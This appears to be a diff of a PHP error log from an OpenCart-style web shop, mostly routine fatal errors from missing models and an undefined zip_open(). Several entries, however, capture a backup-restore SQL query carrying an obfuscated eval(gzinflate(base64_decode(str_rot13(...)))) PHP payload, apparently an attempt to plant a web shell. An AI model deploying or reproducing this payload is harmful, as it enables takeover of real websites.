+#5 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2- in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php on line 67
+[18-Oct-2019 12:15:13 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: Could not load model extension/total/sub_total! in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php:67
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/admin/model/checkout/order.php(344): Loader->model('extension/total...')
+#1 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php(186): ModelCheckoutOrder->addOrderHistory('67', 7, 'Order Cancelled...')
+#2 /home/n4j7xo9m7hs6/public_html/system/engine/proxy.php(25): Loader->{closure}(Array, Array)
+#3 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_sale_order.php(1950): Proxy->__call('addOrderHistory', Array)
+#4 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerSaleOrder->cancel_shipping()
+#5 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2- in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php on line 67
+[18-Oct-2019 12:18:44 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: Could not load model extension/total/sub_total! in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php:67
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/admin/model/checkout/order.php(344): Loader->model('extension/total...')
+#1 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php(186): ModelCheckoutOrder->addOrderHistory('69', 7, 'Order Cancelled...')
+#2 /home/n4j7xo9m7hs6/public_html/system/engine/proxy.php(25): Loader->{closure}(Array, Array)
+#3 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_sale_order.php(1950): Proxy->__call('addOrderHistory', Array)
+#4 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerSaleOrder->cancel_shipping()
+#5 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2- in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php on line 67
+[18-Oct-2019 16:27:45 Asia/Kolkata] PHP Warning:  session_write_close(): Cannot call session save handler in a recursive manner in Unknown on line 0
+[18-Oct-2019 16:27:45 Asia/Kolkata] PHP Warning:  session_write_close(): Cannot call session save handler in a recursive manner in Unknown on line 0
+[18-Oct-2019 16:27:45 Asia/Kolkata] PHP Warning:  session_write_close(): Failed to write session data using user defined save handler. (session.save_path: /tmp) in Unknown on line 0
+[18-Oct-2019 16:27:45 Asia/Kolkata] PHP Warning:  session_write_close(): Failed to write session data using user defined save handler. (session.save_path: /tmp) in Unknown on line 0
+[23-Oct-2019 06:29:55 Asia/Kolkata] PHP Fatal error:  Uncaught Error: Call to undefined function zip_open() in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_extension_installer.php:119
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerExtensionInstaller->upload()
+#1 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerStartupRouter->index()
+#3 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(81): Action->execute(Object(Registry))
+#4 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(76): Front->execute(Object(Action))
+#5 /home/n4j7xo9m7hs6/public_html/system/framework.php(103): Front->dispatch(Object(Action), Object(Action))
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_startup.php(124): require_once('/home in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_extension_installer.php on line 119
+[23-Oct-2019 06:29:59 Asia/Kolkata] PHP Fatal error:  Uncaught Error: Call to undefined function zip_open() in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_extension_installer.php:119
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerExtensionInstaller->upload()
+#1 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerStartupRouter->index()
+#3 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(81): Action->execute(Object(Registry))
+#4 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(76): Front->execute(Object(Action))
+#5 /home/n4j7xo9m7hs6/public_html/system/framework.php(103): Front->dispatch(Object(Action), Object(Action))
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_startup.php(124): require_once('/home in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_extension_installer.php on line 119
+[23-Oct-2019 06:30:28 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: Table 'dikra_beta.mouwaffek_table' doesn't exist<br />Error No: 1146<br />SELECT '<?php eval (gzinflate(base64_decode(str_rot13("ML/EF8ZjRZnsUrk/hVMOJaQZS19pZ3kkVNtX06qEFgnxAct0bH2RGin/zljgT/c2q9
+/iih+BI40TaSguWq98TXxc4k0pOiufqT+K7WvibboK8kxCfTyZ6IddrWcAV5mKhyANXlg0FkNPkJ2wTHUTrlQtoJHUjjyFGycunTqKtI8lnvzPLRJ
+DT6ZEPUoIKJWkYyewYRFaJxt+epn6S0qs39+umDuTfsEJnSmd3HRWTkCv/WgX54K4g98833KBSUHXv/Ygqsr+k4USOENPRjxM/ZkaAk56eYDM0xJ5
+sK552h1khNHKr2lIXpZOhYvSs2VHZh8O8oKbPibYUutxFLYKpCY2KCo8Y7ByDy6D0l8=")))); ?>' FROM `mouwaffek_table` in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php:40
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_library_db.php(45): DB\MySQLi->query('SELECT '<?php e...', Array)
+#1 /home/n4j7xo9m7hs6/public_html/admin/model/tool/backup.php(8): DB->query('SELECT '<?php e...')
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php(186): ModelToolBackup->restore('S in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php on line 40
+[23-Oct-2019 06:30:28 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: Table 'dikra_beta.mouwaffek_table' doesn't exist<br />Error No: 1146<br />SELECT '<?php eval (gzinflate(base64_decode(str_rot13("ML/EF8ZjRZnsUrk/hVMOJaQZS19pZ3kkVNtX06qEFgnxAct0bH2RGin/zljgT/c2q9
+/iih+BI40TaSguWq98TXxc4k0pOiufqT+K7WvibboK8kxCfTyZ6IddrWcAV5mKhyANXlg0FkNPkJ2wTHUTrlQtoJHUjjyFGycunTqKtI8lnvzPLRJ
+DT6ZEPUoIKJWkYyewYRFaJxt+epn6S0qs39+umDuTfsEJnSmd3HRWTkCv/WgX54K4g98833KBSUHXv/Ygqsr+k4USOENPRjxM/ZkaAk56eYDM0xJ5
+sK552h1khNHKr2lIXpZOhYvSs2VHZh8O8oKbPibYUutxFLYKpCY2KCo8Y7ByDy6D0l8=")))); ?>' FROM `mouwaffek_table` in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php:40
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_library_db.php(45): DB\MySQLi->query('SELECT '<?php e...', Array)
+#1 /home/n4j7xo9m7hs6/public_html/admin/model/tool/backup.php(8): DB->query('SELECT '<?php e...')
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php(186): ModelToolBackup->restore('S in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php on line 40
+[25-Oct-2019 00:41:57 Asia/Kolkata] PHP Fatal error:  Uncaught Error: Call to undefined function zip_open() in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_extension_installer.php:119
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerExtensionInstaller->upload()
+#1 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerStartupRouter->index()
+#3 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(81): Action->execute(Object(Registry))
+#4 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(76): Front->execute(Object(Action))
+#5 /home/n4j7xo9m7hs6/public_html/system/framework.php(103): Front->dispatch(Object(Action), Object(Action))
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_startup.php(124): require_once('/home in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_extension_installer.php on line 119
+[25-Oct-2019 00:42:08 Asia/Kolkata] PHP Fatal error:  Uncaught Error: Call to undefined function zip_open() in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_extension_installer.php:119
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerExtensionInstaller->upload()
+#1 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerStartupRouter->index()
+#3 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(81): Action->execute(Object(Registry))
+#4 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(76): Front->execute(Object(Action))
+#5 /home/n4j7xo9m7hs6/public_html/system/framework.php(103): Front->dispatch(Object(Action), Object(Action))
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_startup.php(124): require_once('/home in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_extension_installer.php on line 119
+[25-Oct-2019 00:42:17 Asia/Kolkata] PHP Fatal error:  Uncaught Error: Call to undefined function zip_open() in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_extension_installer.php:119
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerExtensionInstaller->upload()
+#1 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerStartupRouter->index()
+#3 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(81): Action->execute(Object(Registry))
+#4 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(76): Front->execute(Object(Action))
+#5 /home/n4j7xo9m7hs6/public_html/system/framework.php(103): Front->dispatch(Object(Action), Object(Action))
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_startup.php(124): require_once('/home in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_extension_installer.php on line 119
+[25-Oct-2019 00:45:01 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: Table 'dikra_beta.mouwaffek_table' doesn't exist<br />Error No: 1146<br />SELECT '<?php eval (gzinflate(base64_decode(str_rot13("ML/EF8ZjRZnsUrk/hVMOJaQZS19pZ3kkVNtX06qEFgnxAct0bH2RGin/zljgT/c2q9
+/iih+BI40TaSguWq98TXxc4k0pOiufqT+K7WvibboK8kxCfTyZ6IddrWcAV5mKhyANXlg0FkNPkJ2wTHUTrlQtoJHUjjyFGycunTqKtI8lnvzPLRJ
+DT6ZEPUoIKJWkYyewYRFaJxt+epn6S0qs39+umDuTfsEJnSmd3HRWTkCv/WgX54K4g98833KBSUHXv/Ygqsr+k4USOENPRjxM/ZkaAk56eYDM0xJ5
+sK552h1khNHKr2lIXpZOhYvSs2VHZh8O8oKbPibYUutxFLYKpCY2KCo8Y7ByDy6D0l8=")))); ?>' FROM `mouwaffek_table` in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php:40
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_library_db.php(45): DB\MySQLi->query('SELECT '<?php e...', Array)
+#1 /home/n4j7xo9m7hs6/public_html/admin/model/tool/backup.php(8): DB->query('SELECT '<?php e...')
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php(186): ModelToolBackup->restore('S in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php on line 40
+[26-Oct-2019 03:14:19 Asia/Kolkata] PHP Fatal error:  Uncaught Error: Call to undefined function zip_open() in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_extension_installer.php:119
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerExtensionInstaller->upload()
+#1 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerStartupRouter->index()
+#3 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(81): Action->execute(Object(Registry))
+#4 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(76): Front->execute(Object(Action))
+#5 /home/n4j7xo9m7hs6/public_html/system/framework.php(103): Front->dispatch(Object(Action), Object(Action))
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_startup.php(124): require_once('/home in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_extension_installer.php on line 119
+[26-Oct-2019 03:14:28 Asia/Kolkata] PHP Fatal error:  Uncaught Error: Call to undefined function zip_open() in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_extension_installer.php:119
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerExtensionInstaller->upload()
+#1 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerStartupRouter->index()
+#3 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(81): Action->execute(Object(Registry))
+#4 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(76): Front->execute(Object(Action))
+#5 /home/n4j7xo9m7hs6/public_html/system/framework.php(103): Front->dispatch(Object(Action), Object(Action))
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_startup.php(124): require_once('/home in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_extension_installer.php on line 119
+[26-Oct-2019 03:14:35 Asia/Kolkata] PHP Fatal error:  Uncaught Error: Call to undefined function zip_open() in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_extension_installer.php:119
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerExtensionInstaller->upload()
+#1 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerStartupRouter->index()
+#3 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(81): Action->execute(Object(Registry))
+#4 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(76): Front->execute(Object(Action))
+#5 /home/n4j7xo9m7hs6/public_html/system/framework.php(103): Front->dispatch(Object(Action), Object(Action))
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_startup.php(124): require_once('/home in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_extension_installer.php on line 119
+[26-Oct-2019 03:15:09 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: Table 'dikra_beta.mouwaffek_table' doesn't exist<br />Error No: 1146<br />SELECT '<?php eval (gzinflate(base64_decode(str_rot13("ML/EF8ZjRZnsUrk/hVMOJaQZS19pZ3kkVNtX06qEFgnxAct0bH2RGin/zljgT/c2q9
+    /iih+BI40TaSguWq98TXxc4k0pOiufqT+K7WvibboK8kxCfTyZ6IddrWcAV5mKhyANXlg0FkNPkJ2wTHUTrlQtoJHUjjyFGycunTqKtI8lnvzPLRJ
+    DT6ZEPUoIKJWkYyewYRFaJxt+epn6S0qs39+umDuTfsEJnSmd3HRWTkCv/WgX54K4g98833KBSUHXv/Ygqsr+k4USOENPRjxM/ZkaAk56eYDM0xJ5
+    sK552h1khNHKr2lIXpZOhYvSs2VHZh8O8oKbPibYUutxFLYKpCY2KCo8Y7ByDy6D0l8=")))); ?>' FROM `mouwaffek_table`﻿ in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php:40
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_library_db.php(45): DB\MySQLi->query('SELECT '<?php e...', Array)
+#1 /home/n4j7xo9m7hs6/public_html/admin/model/tool/backup.php(8): DB->query('SELECT '<?php e...')
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php(186): ModelToolBac in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php on line 40
+[04-Nov-2019 16:11:22 Asia/Kolkata] PHP Fatal error:  Uncaught Error: Call to undefined function zip_open() in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_extension_installer.php:119
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerExtensionInstaller->upload()
+#1 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerStartupRouter->index()
+#3 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(81): Action->execute(Object(Registry))
+#4 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(76): Front->execute(Object(Action))
+#5 /home/n4j7xo9m7hs6/public_html/system/framework.php(103): Front->dispatch(Object(Action), Object(Action))
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_startup.php(124): require_once('/home in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_extension_installer.php on line 119
